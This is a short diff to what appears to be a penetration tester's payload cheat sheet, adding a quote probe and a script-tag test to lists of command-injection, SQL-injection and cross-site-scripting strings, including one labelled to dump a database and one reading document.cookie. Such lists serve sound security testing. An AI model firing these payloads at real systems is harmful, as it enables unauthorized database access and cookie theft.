@@ -25,6 +25,8 @@ $(echo echo Test) #bash
 
 ' or '1'='1 #basic test to see if it will dump db
 
+Test'
+
 --# JS #--
 <script>alert(document.domain);</script>
 <script>alert(document.cookie);</script>
@@ -55,3 +57,4 @@ protocol - telnet, ftp, smb, etc
 
 
 --# XSS #--
+Test<script>alert(1);</script>
